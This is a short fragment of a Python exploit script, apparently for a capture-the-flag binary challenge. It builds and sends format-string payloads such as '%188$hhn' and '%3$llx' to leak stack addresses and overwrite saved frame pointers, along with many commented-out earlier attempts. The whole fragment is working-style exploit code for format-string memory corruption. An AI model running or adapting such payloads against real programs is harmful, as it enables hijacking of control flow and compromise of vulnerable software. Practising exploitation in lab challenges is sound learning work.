...
# b"%75$p" 
# exp2 = b"%0123d%189$hnaaa"
# io.sendline(b"%188$p")
# io.recvuntil(b"Your input is:")

# func2 = 0x12c5
# payload = b"%c "*187
# payload += (f"{func2} c%n").encode()
# payload += b"%c "
# payload = b"%188$p %1234d %189$n"
## %190$p - main rbp , %188$p - func rbp
# write main rbp to point _start - 8
# payload = b"%1c%188$hhn" 
# p1 =  "aaaa" + "%188$hhn"
payload= b'%3$llx\n%188$llx\naaaaaaaaaaaaaa%188$hhn'
# payload = p1.encode()
print("payload")
print(payload)
io.sendline(payload)
